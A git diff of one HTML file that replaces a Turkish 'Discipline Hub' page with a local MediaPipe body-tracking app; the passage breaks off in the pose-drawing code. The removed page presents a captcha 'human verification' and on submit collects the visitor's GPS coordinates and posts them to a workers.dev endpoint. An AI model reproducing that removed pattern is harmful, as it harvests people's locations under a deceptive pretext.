@@ -1,160 +1,1072 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>Discipline Hub</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>🦾 Human Limb Detector</title>
 
-<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+  <!-- ── MediaPipe CDN ── -->
+  <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@mediapipe/control_utils/control_utils.js" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@mediapipe/drawing_utils/drawing_utils.js" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@mediapipe/holistic/holistic.js" crossorigin="anonymous"></script>
 
-<style>
-* { margin:0; padding:0; box-sizing:border-box; }
+  <style>
+    /* ─── Reset & Base ─── */
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    :root {
+      --bg: #0d0f1a;
+      --panel: #13162a;
+      --border: #1e2340;
+      --accent: #5b8af5;
+      --accent2: #9b5cf5;
+      --green: #3ef5a0;
+      --yellow: #f5c842;
+      --red: #f55b5b;
+      --orange: #f5a235;
+      --text: #dde3ff;
+      --muted: #6b75a8;
+      --glow: rgba(91,138,245,0.35);
+    }
+    html, body {
+      width: 100%; height: 100%;
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+      overflow: hidden;
+    }
 
-body {
-  height:100vh;
-  background:#050510;
-  overflow:hidden;
-  font-family:Arial, sans-serif;
-  color:white;
-}
+    /* ─── Layout ─── */
+    #app {
+      display: flex;
+      flex-direction: column;
+      height: 100vh;
+    }
 
-/* Arka plan canvas */
-canvas {
-  position:fixed;
-  top:0;
-  left:0;
-  z-index:0;
-}
+    /* ─── Top Bar ─── */
+    #topbar {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 10px 20px;
+      background: var(--panel);
+      border-bottom: 1px solid var(--border);
+      flex-shrink: 0;
+      z-index: 10;
+    }
+    #topbar .logo {
+      display: flex; align-items: center; gap: 10px;
+      font-size: 1.15rem; font-weight: 700; letter-spacing: .5px;
+    }
+    #topbar .logo .icon { font-size: 1.5rem; }
+    #topbar .subtitle { font-size: .72rem; color: var(--muted); margin-top: 1px; }
+    #status-pill {
+      display: flex; align-items: center; gap: 8px;
+      background: rgba(255,255,255,.04);
+      border: 1px solid var(--border);
+      border-radius: 50px;
+      padding: 5px 14px;
+      font-size: .78rem;
+      transition: all .3s;
+    }
+    #status-dot {
+      width: 8px; height: 8px; border-radius: 50%;
+      background: var(--yellow);
+      animation: pulse 1.4s infinite;
+    }
+    #status-dot.ready   { background: var(--green);  animation: none; }
+    #status-dot.error   { background: var(--red);    animation: none; }
+    @keyframes pulse {
+      0%,100% { opacity: 1; transform: scale(1); }
+      50%      { opacity: .5; transform: scale(.75); }
+    }
+    #fps-badge {
+      background: rgba(91,138,245,.15);
+      border: 1px solid rgba(91,138,245,.3);
+      border-radius: 6px;
+      padding: 4px 10px;
+      font-size: .75rem; font-weight: 600;
+      color: var(--accent);
+      min-width: 64px; text-align: center;
+    }
 
-/* Ortadaki kart */
-.card {
-  position:absolute;
-  top:50%;
-  left:50%;
-  transform:translate(-50%,-50%);
-  background:rgba(10,10,20,0.85);
-  padding:50px;
-  border-radius:20px;
-  backdrop-filter:blur(15px);
-  box-shadow:0 0 40px #00f0ff;
-  text-align:center;
-  z-index:2;
-}
+    /* ─── Main content ─── */
+    #main {
+      flex: 1;
+      display: flex;
+      gap: 0;
+      overflow: hidden;
+    }
 
-h2 {
-  margin-bottom:25px;
-  text-shadow:0 0 10px #00f0ff;
-}
+    /* ─── Camera area ─── */
+    #camera-wrap {
+      flex: 1;
+      position: relative;
+      display: flex; align-items: center; justify-content: center;
+      background: #07080f;
+      overflow: hidden;
+    }
+    #input_video {
+      position: absolute;
+      width: 1px; height: 1px;
+      opacity: 0; pointer-events: none;
+    }
+    #output_canvas {
+      max-width: 100%; max-height: 100%;
+      width: 100%; height: 100%;
+      object-fit: contain;
+      display: block;
+    }
 
-button {
-  margin-top:25px;
-  padding:12px 35px;
-  border:none;
-  border-radius:8px;
-  background:#00f0ff;
-  font-size:16px;
-  cursor:pointer;
-  transition:0.3s;
-}
+    /* ─── Permission overlay ─── */
+    #permission-overlay {
+      position: absolute; inset: 0;
+      display: flex; flex-direction: column;
+      align-items: center; justify-content: center;
+      background: rgba(7,8,15,.92);
+      backdrop-filter: blur(6px);
+      z-index: 20;
+      gap: 16px;
+      transition: opacity .4s;
+    }
+    #permission-overlay.hidden { opacity: 0; pointer-events: none; }
+    .perm-icon { font-size: 3.5rem; }
+    .perm-title { font-size: 1.4rem; font-weight: 700; }
+    .perm-sub { color: var(--muted); font-size: .9rem; text-align: center; max-width: 300px; line-height: 1.5; }
+    #start-btn {
+      margin-top: 10px;
+      padding: 13px 36px;
+      border: none; border-radius: 50px;
+      background: linear-gradient(135deg, var(--accent), var(--accent2));
+      color: #fff; font-size: 1rem; font-weight: 700;
+      cursor: pointer;
+      box-shadow: 0 0 24px var(--glow);
+      transition: transform .15s, box-shadow .15s;
+    }
+    #start-btn:hover { transform: scale(1.05); box-shadow: 0 0 36px var(--glow); }
+    #start-btn:active { transform: scale(.97); }
+    #err-msg { color: var(--red); font-size: .85rem; display: none; }
 
-button:hover {
-  background:#ff00ff;
-  box-shadow:0 0 20px #ff00ff;
-}
-</style>
+    /* ─── Loading spinner ─── */
+    #loading-overlay {
+      position: absolute; inset: 0;
+      display: flex; flex-direction: column;
+      align-items: center; justify-content: center;
+      background: rgba(7,8,15,.88);
+      z-index: 15;
+      gap: 16px;
+      transition: opacity .4s;
+    }
+    #loading-overlay.hidden { opacity: 0; pointer-events: none; }
+    .spinner {
+      width: 48px; height: 48px;
+      border: 4px solid rgba(91,138,245,.2);
+      border-top-color: var(--accent);
+      border-radius: 50%;
+      animation: spin .8s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .load-text { color: var(--muted); font-size: .9rem; }
+
+    /* ─── Side Panel ─── */
+    #side-panel {
+      width: 270px;
+      background: var(--panel);
+      border-left: 1px solid var(--border);
+      display: flex; flex-direction: column;
+      padding: 14px 12px;
+      gap: 12px;
+      overflow-y: auto;
+      flex-shrink: 0;
+    }
+    .panel-title {
+      font-size: .7rem; font-weight: 700;
+      letter-spacing: 1.2px; text-transform: uppercase;
+      color: var(--muted);
+      padding: 0 4px 6px;
+      border-bottom: 1px solid var(--border);
+    }
+
+    /* ─── Detection Cards ─── */
+    .det-group { display: flex; flex-direction: column; gap: 6px; }
+    .det-card {
+      background: rgba(255,255,255,.03);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 9px 12px;
+      display: flex; align-items: center; gap: 10px;
+      transition: border-color .25s, background .25s;
+    }
+    .det-card.active {
+      border-color: var(--accent);
+      background: rgba(91,138,245,.08);
+    }
+    .det-card.active-green  { border-color: var(--green);  background: rgba(62,245,160,.07); }
+    .det-card.active-orange { border-color: var(--orange); background: rgba(245,162,53,.07); }
+    .det-card.active-yellow { border-color: var(--yellow); background: rgba(245,200,66,.07); }
+    .det-card.active-purple { border-color: var(--accent2); background: rgba(155,92,245,.07); }
+
+    .det-icon { font-size: 1.3rem; flex-shrink: 0; }
+    .det-info { flex: 1; min-width: 0; }
+    .det-name { font-size: .82rem; font-weight: 600; }
+    .det-sub  { font-size: .69rem; color: var(--muted); margin-top: 2px; }
+    .det-badge {
+      font-size: .68rem; font-weight: 700;
+      padding: 2px 7px; border-radius: 20px;
+      background: rgba(255,255,255,.06);
+      color: var(--muted);
+      white-space: nowrap;
+      transition: all .25s;
+    }
+    .det-card.active         .det-badge { background: rgba(91,138,245,.25);  color: var(--accent); }
+    .det-card.active-green   .det-badge { background: rgba(62,245,160,.2);   color: var(--green); }
+    .det-card.active-orange  .det-badge { background: rgba(245,162,53,.2);   color: var(--orange); }
+    .det-card.active-yellow  .det-badge { background: rgba(245,200,66,.2);   color: var(--yellow); }
+    .det-card.active-purple  .det-badge { background: rgba(155,92,245,.22);  color: var(--accent2); }
+
+    /* ─── Stats ─── */
+    .stats-grid {
+      display: grid; grid-template-columns: 1fr 1fr;
+      gap: 8px;
+    }
+    .stat-box {
+      background: rgba(255,255,255,.03);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 10px 12px;
+      text-align: center;
+    }
+    .stat-val { font-size: 1.35rem; font-weight: 700; color: var(--accent); }
+    .stat-lbl { font-size: .65rem; color: var(--muted); margin-top: 2px; text-transform: uppercase; letter-spacing: .8px; }
+
+    /* ─── Confidence bar ─── */
+    .conf-row { display: flex; align-items: center; gap: 8px; }
+    .conf-label { font-size: .73rem; color: var(--muted); width: 64px; flex-shrink: 0; }
+    .conf-bar-wrap {
+      flex: 1; height: 6px; border-radius: 3px;
+      background: rgba(255,255,255,.07); overflow: hidden;
+    }
+    .conf-bar {
+      height: 100%; border-radius: 3px; width: 0%;
+      transition: width .3s;
+      background: linear-gradient(90deg, var(--accent), var(--accent2));
+    }
+    .conf-val { font-size: .72rem; font-weight: 600; width: 36px; text-align: right; color: var(--text); }
+
+    /* ─── Controls ─── */
+    .control-row {
+      display: flex; gap: 8px; flex-wrap: wrap;
+    }
+    .ctrl-btn {
+      flex: 1; min-width: 80px;
+      padding: 8px 10px;
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      background: rgba(255,255,255,.04);
+      color: var(--text);
+      font-size: .78rem; font-weight: 600;
+      cursor: pointer;
+      transition: all .2s;
+      display: flex; align-items: center; justify-content: center; gap: 5px;
+    }
+    .ctrl-btn:hover { background: rgba(91,138,245,.15); border-color: var(--accent); }
+    .ctrl-btn.active { background: rgba(91,138,245,.2); border-color: var(--accent); color: var(--accent); }
+    .ctrl-btn.danger:hover { background: rgba(245,91,91,.15); border-color: var(--red); color: var(--red); }
+
+    /* ─── Toggle switch ─── */
+    .toggle-row {
+      display: flex; align-items: center; justify-content: space-between;
+      padding: 4px 2px;
+    }
+    .toggle-label { font-size: .8rem; color: var(--text); display: flex; align-items: center; gap: 6px; }
+    .toggle-label .tl-icon { font-size: .95rem; }
+    .toggle {
+      position: relative; width: 36px; height: 20px;
+      cursor: pointer;
+    }
+    .toggle input { opacity: 0; width: 0; height: 0; }
+    .toggle-slider {
+      position: absolute; inset: 0;
+      background: rgba(255,255,255,.12);
+      border-radius: 20px;
+      transition: background .25s;
+    }
+    .toggle-slider::before {
+      content: '';
+      position: absolute;
+      width: 14px; height: 14px;
+      left: 3px; top: 3px;
+      background: #fff; border-radius: 50%;
+      transition: transform .25s;
+    }
+    .toggle input:checked ~ .toggle-slider { background: var(--accent); }
+    .toggle input:checked ~ .toggle-slider::before { transform: translateX(16px); }
+
+    /* ─── Bottom bar ─── */
+    #bottombar {
+      padding: 6px 20px;
+      background: var(--panel);
+      border-top: 1px solid var(--border);
+      font-size: .7rem; color: var(--muted);
+      display: flex; justify-content: space-between; align-items: center;
+      flex-shrink: 0;
+    }
+    #bottombar a { color: var(--accent); text-decoration: none; }
+    #bottombar a:hover { text-decoration: underline; }
+
+    /* ─── Landmark tooltip ─── */
+    #lm-tooltip {
+      position: absolute;
+      background: rgba(13,15,26,.9);
+      border: 1px solid var(--accent);
+      border-radius: 8px;
+      padding: 6px 10px;
+      font-size: .75rem;
+      pointer-events: none;
+      z-index: 30;
+      display: none;
+      white-space: nowrap;
+      backdrop-filter: blur(4px);
+    }
+
+    /* ─── Responsive ─── */
+    @media (max-width: 680px) {
+      #side-panel { width: 100%; height: 220px; border-left: none; border-top: 1px solid var(--border); flex-direction: row; flex-wrap: wrap; overflow-x: auto; }
+      #main { flex-direction: column; }
+    }
+  </style>
 </head>
-
 <body>
+<div id="app">
 
-<canvas id="bg"></canvas>
+  <!-- ── Top Bar ── -->
+  <div id="topbar">
+    <div class="logo">
+      <span class="icon">🦾</span>
+      <div>
+        <div>Human Limb Detector</div>
+        <div class="subtitle">MediaPipe Holistic · Real-time body tracking</div>
+      </div>
+    </div>
+    <div style="display:flex;gap:10px;align-items:center;">
+      <div id="fps-badge">-- FPS</div>
+      <div id="status-pill">
+        <div id="status-dot"></div>
+        <span id="status-text">Waiting…</span>
+      </div>
+    </div>
+  </div>
 
-<div class="card">
-  <h2>İnsan Doğrulaması</h2>
+  <!-- ── Main ── -->
+  <div id="main">
 
-  <form id="verifyForm">
-    <div class="cf-turnstile"
-         data-sitekey="0x4AAAAAACajPIDrosxxpJUl">
+    <!-- Camera -->
+    <div id="camera-wrap">
+      <video id="input_video" playsinline></video>
+      <canvas id="output_canvas"></canvas>
+      <div id="lm-tooltip"></div>
+
+      <!-- Permission overlay -->
+      <div id="permission-overlay">
+        <div class="perm-icon">📷</div>
+        <div class="perm-title">Camera Access Required</div>
+        <div class="perm-sub">This app uses your camera to detect and visualise human body parts in real time. No data leaves your device.</div>
+        <button id="start-btn">🚀 Enable Camera</button>
+        <div id="err-msg">⚠️ Could not access camera. Please check permissions.</div>
+      </div>
+
+      <!-- Loading overlay -->
+      <div id="loading-overlay" class="hidden">
+        <div class="spinner"></div>
+        <div class="load-text">Loading AI model…</div>
+      </div>
     </div>
 
-    <button type="submit">Devam Et</button>
-  </form>
+    <!-- Side panel -->
+    <div id="side-panel">
+
+      <!-- Detection cards -->
+      <div class="panel-title">📍 Body Part Detection</div>
+      <div class="det-group">
+        <div class="det-card" id="card-left-hand">
+          <div class="det-icon">🖐️</div>
+          <div class="det-info">
+            <div class="det-name">Left Hand</div>
+            <div class="det-sub">21 landmarks</div>
+          </div>
+          <div class="det-badge" id="badge-left-hand">—</div>
+        </div>
+        <div class="det-card" id="card-right-hand">
+          <div class="det-icon">✋</div>
+          <div class="det-info">
+            <div class="det-name">Right Hand</div>
+            <div class="det-sub">21 landmarks</div>
+          </div>
+          <div class="det-badge" id="badge-right-hand">—</div>
+        </div>
+        <div class="det-card" id="card-left-foot">
+          <div class="det-icon">🦶</div>
+          <div class="det-info">
+            <div class="det-name">Left Foot</div>
+            <div class="det-sub">Ankle · Heel · Toe</div>
+          </div>
+          <div class="det-badge" id="badge-left-foot">—</div>
+        </div>
+        <div class="det-card" id="card-right-foot">
+          <div class="det-icon">🦶</div>
+          <div class="det-info">
+            <div class="det-name">Right Foot</div>
+            <div class="det-sub">Ankle · Heel · Toe</div>
+          </div>
+          <div class="det-badge" id="badge-right-foot">—</div>
+        </div>
+        <div class="det-card" id="card-arms">
+          <div class="det-icon">💪</div>
+          <div class="det-info">
+            <div class="det-name">Arms</div>
+            <div class="det-sub">Shoulder · Elbow · Wrist</div>
+          </div>
+          <div class="det-badge" id="badge-arms">—</div>
+        </div>
+        <div class="det-card" id="card-legs">
+          <div class="det-icon">🦵</div>
+          <div class="det-info">
+            <div class="det-name">Legs</div>
+            <div class="det-sub">Hip · Knee · Ankle</div>
+          </div>
+          <div class="det-badge" id="badge-legs">—</div>
+        </div>
+        <div class="det-card" id="card-torso">
+          <div class="det-icon">🫀</div>
+          <div class="det-info">
+            <div class="det-name">Torso</div>
+            <div class="det-sub">Shoulder · Hip axis</div>
+          </div>
+          <div class="det-badge" id="badge-torso">—</div>
+        </div>
+        <div class="det-card" id="card-face">
+          <div class="det-icon">😊</div>
+          <div class="det-info">
+            <div class="det-name">Face</div>
+            <div class="det-sub">468 mesh points</div>
+          </div>
+          <div class="det-badge" id="badge-face">—</div>
+        </div>
+      </div>
+
+      <!-- Stats -->
+      <div class="panel-title">📊 Stats</div>
+      <div class="stats-grid">
+        <div class="stat-box">
+          <div class="stat-val" id="stat-landmarks">0</div>
+          <div class="stat-lbl">Landmarks</div>
+        </div>
+        <div class="stat-box">
+          <div class="stat-val" id="stat-parts">0</div>
+          <div class="stat-lbl">Parts Detected</div>
+        </div>
+        <div class="stat-box">
+          <div class="stat-val" id="stat-fps">--</div>
+          <div class="stat-lbl">FPS</div>
+        </div>
+        <div class="stat-box">
+          <div class="stat-val" id="stat-frames">0</div>
+          <div class="stat-lbl">Frames</div>
+        </div>
+      </div>
+
+      <!-- Confidence -->
+      <div class="panel-title">🎯 Pose Confidence</div>
+      <div style="display:flex;flex-direction:column;gap:7px;">
+        <div class="conf-row">
+          <div class="conf-label">L. Hand</div>
+          <div class="conf-bar-wrap"><div class="conf-bar" id="conf-lh"></div></div>
+          <div class="conf-val" id="conf-lh-val">0%</div>
+        </div>
+        <div class="conf-row">
+          <div class="conf-label">R. Hand</div>
+          <div class="conf-bar-wrap"><div class="conf-bar" id="conf-rh"></div></div>
+          <div class="conf-val" id="conf-rh-val">0%</div>
+        </div>
+        <div class="conf-row">
+          <div class="conf-label">Pose</div>
+          <div class="conf-bar-wrap"><div class="conf-bar" id="conf-pose"></div></div>
+          <div class="conf-val" id="conf-pose-val">0%</div>
+        </div>
+        <div class="conf-row">
+          <div class="conf-label">Face</div>
+          <div class="conf-bar-wrap"><div class="conf-bar" id="conf-face"></div></div>
+          <div class="conf-val" id="conf-face-val">0%</div>
+        </div>
+      </div>
+
+      <!-- Toggles -->
+      <div class="panel-title">⚙️ Overlay Options</div>
+      <div style="display:flex;flex-direction:column;gap:8px;">
+        <div class="toggle-row">
+          <label class="toggle-label"><span class="tl-icon">💀</span> Pose Skeleton</label>
+          <label class="toggle"><input type="checkbox" id="tog-pose" checked><span class="toggle-slider"></span></label>
+        </div>
+        <div class="toggle-row">
+          <label class="toggle-label"><span class="tl-icon">🖐️</span> Hand Landmarks</label>
+          <label class="toggle"><input type="checkbox" id="tog-hands" checked><span class="toggle-slider"></span></label>
+        </div>
+        <div class="toggle-row">
+          <label class="toggle-label"><span class="tl-icon">😊</span> Face Mesh</label>
+          <label class="toggle"><input type="checkbox" id="tog-face" checked><span class="toggle-slider"></span></label>
+        </div>
+        <div class="toggle-row">
+          <label class="toggle-label"><span class="tl-icon">🏷️</span> Part Labels</label>
+          <label class="toggle"><input type="checkbox" id="tog-labels" checked><span class="toggle-slider"></span></label>
+        </div>
+        <div class="toggle-row">
+          <label class="toggle-label"><span class="tl-icon">🪞</span> Mirror Video</label>
+          <label class="toggle"><input type="checkbox" id="tog-mirror" checked><span class="toggle-slider"></span></label>
+        </div>
+      </div>
+
+      <!-- Controls -->
+      <div class="panel-title">🎛️ Controls</div>
+      <div class="control-row">
+        <button class="ctrl-btn" id="btn-snapshot" title="Save screenshot">📸 Snapshot</button>
+        <button class="ctrl-btn danger" id="btn-stop" title="Stop camera">⏹ Stop</button>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ── Bottom Bar ── -->
+  <div id="bottombar">
+    <span>Powered by <a href="https://developers.google.com/mediapipe" target="_blank">MediaPipe Holistic</a> · All processing is 100% local</span>
+    <span id="resolution-lbl">Resolution: --</span>
+  </div>
 </div>
 
+<!-- ── Hidden download link ── -->
+<a id="dl-link" style="display:none"></a>
+
 <script>
-// --- Neon Particle Background ---
-const canvas = document.getElementById("bg");
-const ctx = canvas.getContext("2d");
-canvas.width = innerWidth;
-canvas.height = innerHeight;
+'use strict';
 
-let particles = [];
+/* ─── DOM refs ─── */
+const video      = document.getElementById('input_video');
+const canvas     = document.getElementById('output_canvas');
+const ctx        = canvas.getContext('2d');
+const permOverlay  = document.getElementById('permission-overlay');
+const loadOverlay  = document.getElementById('loading-overlay');
+const startBtn     = document.getElementById('start-btn');
+const errMsg       = document.getElementById('err-msg');
+const statusDot    = document.getElementById('status-dot');
+const statusText   = document.getElementById('status-text');
+const fpsBadge     = document.getElementById('fps-badge');
+const tooltip      = document.getElementById('lm-tooltip');
+const dlLink       = document.getElementById('dl-link');
 
-for (let i = 0; i < 120; i++) {
-  particles.push({
-    x: Math.random() * canvas.width,
-    y: Math.random() * canvas.height,
-    vx: (Math.random() - 0.5) * 1.5,
-    vy: (Math.random() - 0.5) * 1.5
-  });
+/* ─── Toggles ─── */
+const togPose    = document.getElementById('tog-pose');
+const togHands   = document.getElementById('tog-hands');
+const togFace    = document.getElementById('tog-face');
+const togLabels  = document.getElementById('tog-labels');
+const togMirror  = document.getElementById('tog-mirror');
+
+/* ─── Stats ─── */
+let frameCount = 0, fps = 0, fpsTimer = 0, partsDetected = 0;
+let totalLandmarks = 0;
+let cameraRunning = false;
+let cameraInstance = null;
+
+/* ─── FPS counter ─── */
+function updateFPS(ts) {
+  frameCount++;
+  if (ts - fpsTimer >= 1000) {
+    fps = frameCount;
+    frameCount = 0;
+    fpsTimer = ts;
+    fpsBadge.textContent = fps + ' FPS';
+    document.getElementById('stat-fps').textContent = fps;
+  }
 }
 
-function animate() {
-  ctx.fillStyle = "rgba(0,0,20,0.2)";
-  ctx.fillRect(0,0,canvas.width,canvas.height);
+/* ─── Card helpers ─── */
+const ACTIVE_CLASS = {
+  hand:   'active-green',
+  foot:   'active-orange',
+  arm:    'active',
+  leg:    'active-yellow',
+  torso:  'active-purple',
+  face:   'active'
+};
+function setCard(id, type, detected, label) {
+  const card  = document.getElementById('card-' + id);
+  const badge = document.getElementById('badge-' + id);
+  card.className = 'det-card' + (detected ? ' ' + (ACTIVE_CLASS[type] || 'active') : '');
+  badge.textContent = detected ? label : '—';
+}
 
-  particles.forEach(p => {
-    p.x += p.vx;
-    p.y += p.vy;
+/* ─── Confidence bar ─── */
+function setConf(id, pct) {
+  const p = Math.round(pct * 100);
+  document.getElementById('conf-' + id).style.width = p + '%';
+  document.getElementById('conf-' + id + '-val').textContent = p + '%';
+}
 
-    if (p.x < 0 || p.x > canvas.width) p.vx *= -1;
-    if (p.y < 0 || p.y > canvas.height) p.vy *= -1;
+/* ─── Canvas resize ─── */
+function resizeCanvas(w, h) {
+  canvas.width  = w;
+  canvas.height = h;
+  document.getElementById('resolution-lbl').textContent = `Resolution: ${w}×${h}`;
+}
 
+/* ─── MediaPipe landmark index groups ─── */
+// Pose landmark indices (33 total)
+const POSE = {
+  NOSE:          0,
+  L_SHOULDER:    11, R_SHOULDER: 12,
+  L_ELBOW:       13, R_ELBOW:    14,
+  L_WRIST:       15, R_WRIST:    16,
+  L_PINKY:       17, R_PINKY:    18,
+  L_INDEX:       19, R_INDEX:    20,
+  L_THUMB:       21, R_THUMB:    22,
+  L_HIP:         23, R_HIP:      24,
+  L_KNEE:        25, R_KNEE:     26,
+  L_ANKLE:       27, R_ANKLE:    28,
+  L_HEEL:        29, R_HEEL:     30,
+  L_FOOT_INDEX:  31, R_FOOT_INDEX: 32
+};
+
+/* ─── Color palette ─── */
+const COLORS = {
+  leftHand:    '#3ef5a0',
+  rightHand:   '#5b8af5',
+  leftFoot:    '#f5a235',
+  rightFoot:   '#f5c842',
+  leftArm:     '#9b5cf5',
+  rightArm:    '#f55b5b',
+  leftLeg:     '#5bf5e8',
+  rightLeg:    '#f55b8a',
+  torso:       '#ffffff',
+  face:        'rgba(200,200,255,0.55)'
+};
+
+/* ─── Draw skeleton connections ─── */
+function drawConnection(lms, a, b, color, width = 2) {
+  if (!lms || !lms[a] || !lms[b]) return;
+  const la = lms[a], lb = lms[b];
+  if (la.visibility < 0.3 || lb.visibility < 0.3) return;
+  const W = canvas.width, H = canvas.height;
+  ctx.beginPath();
+  ctx.moveTo(la.x * W, la.y * H);
+  ctx.lineTo(lb.x * W, lb.y * H);
+  ctx.strokeStyle = color;
+  ctx.lineWidth   = width;
+  ctx.lineCap     = 'round';
+  ctx.stroke();
+}
+
+function drawDot(lms, idx, color, radius = 5) {
+  if (!lms || !lms[idx]) return;
+  const lm = lms[idx];
+  if (lm.visibility !== undefined && lm.visibility < 0.3) return;
+  const W = canvas.width, H = canvas.height;
+  ctx.beginPath();
+  ctx.arc(lm.x * W, lm.y * H, radius, 0, Math.PI * 2);
+  ctx.fillStyle = color;
+  ctx.fill();
+  ctx.strokeStyle = '#fff';
+  ctx.lineWidth = 1.5;
+  ctx.stroke();
+}
+
+/* ─── Draw label near landmark ─── */
+function drawLabel(lms, idx, text, color) {
+  if (!togLabels.checked) return;
+  if (!lms || !lms[idx]) return;
+  const lm = lms[idx];
+  if (lm.visibility !== undefined && lm.visibility < 0.35) return;
+  const W = canvas.width, H = canvas.height;
+  const x = lm.x * W, y = lm.y * H;
+  ctx.font = 'bold 11px Segoe UI, sans-serif';
+  ctx.textAlign = 'center';
+  const pad = 3, tw = ctx.measureText(text).width;
+  ctx.fillStyle = 'rgba(0,0,0,0.6)';
+  ctx.beginPath();
+  ctx.roundRect(x - tw/2 - pad, y - 18 - pad, tw + pad*2, 16 + pad*2, 4);
+  ctx.fill();
+  ctx.fillStyle = color;
+  ctx.fillText(text, x, y - 6);
+}
+
+/* ─── Draw hand connections ─── */
+const HAND_CONNECTIONS = [
+  [0,1],[1,2],[2,3],[3,4],
+  [0,5],[5,6],[6,7],[7,8],
+  [5,9],[9,10],[10,11],[11,12],
+  [9,13],[13,14],[14,15],[15,16],
+  [13,17],[17,18],[18,19],[19,20],
+  [0,17]
+];
+const HAND_FINGER_TIPS = [4, 8, 12, 16, 20];
+const HAND_FINGER_NAMES = ['Thumb','Index','Middle','Ring','Pinky'];
+
+function drawHand(lms, color) {
+  if (!lms || !togHands.checked) return;
+  const W = canvas.width, H = canvas.height;
+  HAND_CONNECTIONS.forEach(([a,b]) => {
+    if (!lms[a] || !lms[b]) return;
     ctx.beginPath();
-    ctx.arc(p.x, p.y, 2, 0, Math.PI*2);
-    ctx.fillStyle = "#00f0ff";
+    ctx.moveTo(lms[a].x * W, lms[a].y * H);
+    ctx.lineTo(lms[b].x * W, lms[b].y * H);
+    ctx.strokeStyle = color;
+    ctx.lineWidth = 2;
+    ctx.lineCap = 'round';
+    ctx.stroke();
+  });
+  lms.forEach((lm, i) => {
+    const isTip = HAND_FINGER_TIPS.includes(i);
+    ctx.beginPath();
+    ctx.arc(lm.x * W, lm.y * H, isTip ? 6 : 3.5, 0, Math.PI * 2);
+    ctx.fillStyle = isTip ? '#fff' : color;
     ctx.fill();
+    if (isTip) {
+      ctx.strokeStyle = color;
+      ctx.lineWidth = 2;
+      ctx.stroke();
+    }
   });
-
-  requestAnimationFrame(animate);
 }
-animate();
 
+/* ─── Check landmark visibility ─── */
+function isVisible(lms, idx, thr = 0.4) {
+  return lms && lms[idx] && (lms[idx].visibility === undefined || lms[idx].visibility >= thr);
+}
 
-// --- FORM SUBMIT ---
-document.getElementById("verifyForm").addEventListener("submit", async function(e){
-  e.preventDefault();
+/* ─── Main results callback ─── */
+let lastResults = null;
 
-  const token = document.querySelector('[name="cf-turnstile-response"]').value;
+function onResults(results) {
+  const ts = performance.now();
+  updateFPS(ts);
+  document.getElementById('stat-frames').textContent = parseInt(document.getElementById('stat-frames').textContent) + 1;
 
-  if (!token) {
-    alert("Captcha doğrulanmadı.");
-    return;
+  const W = video.videoWidth  || canvas.width;
+  const H = video.videoHeight || canvas.height;
+  if (canvas.width !== W || canvas.height !== H) resizeCanvas(W, H);
+
+  lastResults = results;
+
+  ctx.clearRect(0, 0, W, H);
+
+  // Mirror
+  ctx.save();
+  if (togMirror.checked) {
+    ctx.scale(-1, 1);
+    ctx.translate(-W, 0);
   }
 
-  if (!navigator.geolocation) {
-    alert("Konum desteklenmiyor.");
-    return;
+  // Draw video frame
+  ctx.drawImage(results.image, 0, 0, W, H);
+
+  const pose  = results.poseLandmarks;
+  const lh    = results.leftHandLandmarks;
+  const rh    = results.rightHandLandmarks;
+  const face  = results.faceLandmarks;
+
+  let parts = 0;
+  let lmCount = 0;
+
+  /* ── Face ── */
+  if (face && togFace.checked) {
+    drawConnectors(ctx, face,
+      window.FACEMESH_TESSELATION,
+      { color: 'rgba(180,190,255,0.15)', lineWidth: 0.5 });
+    drawConnectors(ctx, face,
+      window.FACEMESH_RIGHT_EYE,
+      { color: 'rgba(91,138,245,0.7)', lineWidth: 1 });
+    drawConnectors(ctx, face,
+      window.FACEMESH_LEFT_EYE,
+      { color: 'rgba(91,138,245,0.7)', lineWidth: 1 });
+    drawConnectors(ctx, face,
+      window.FACEMESH_LIPS,
+      { color: 'rgba(245,91,138,0.7)', lineWidth: 1.2 });
+    lmCount += face.length;
+    parts++;
+    setCard('face','face', true, '✓ 468 pts');
+    setConf('face', 0.9);
+  } else {
+    setCard('face','face', false, '—');
+    setConf('face', 0);
   }
 
-  navigator.geolocation.getCurrentPosition(async (pos) => {
+  /* ── Pose skeleton ── */
+  if (pose && togPose.checked) {
+    // Torso
+    drawConnection(pose, POSE.L_SHOULDER, POSE.R_SHOULDER, COLORS.torso, 2.5);
+    drawConnection(pose, POSE.L_HIP,      POSE.R_HIP,      COLORS.torso, 2.5);
+    drawConnection(pose, POSE.L_SHOULDER, POSE.L_HIP,      COLORS.torso, 2.5);
+    drawConnection(pose, POSE.R_SHOULDER, POSE.R_HIP,      COLORS.torso, 2.5);
 
-    const formData = new FormData();
-    formData.append("cf-turnstile-response", token);
-    formData.append("latitude", pos.coords.latitude);
-    formData.append("longitude", pos.coords.longitude);
+    // Left arm
+    drawConnection(pose, POSE.L_SHOULDER, POSE.L_ELBOW, COLORS.leftArm, 3);
+    drawConnection(pose, POSE.L_ELBOW,    POSE.L_WRIST, COLORS.leftArm, 3);
+    drawConnection(pose, POSE.L_WRIST,    POSE.L_PINKY, COLORS.leftArm, 2);
+    drawConnection(pose, POSE.L_WRIST,    POSE.L_INDEX, COLORS.leftArm, 2);
+    drawConnection(pose, POSE.L_WRIST,    POSE.L_THUMB, COLORS.leftArm, 2);
 
-    const res = await fetch("https://disciplinehub.disciplinehub.workers.dev", {
-      method: "POST",
-      body: formData
-    });
+    // Right arm
+    drawConnection(pose, POSE.R_SHOULDER, POSE.R_ELBOW, COLORS.rightArm, 3);
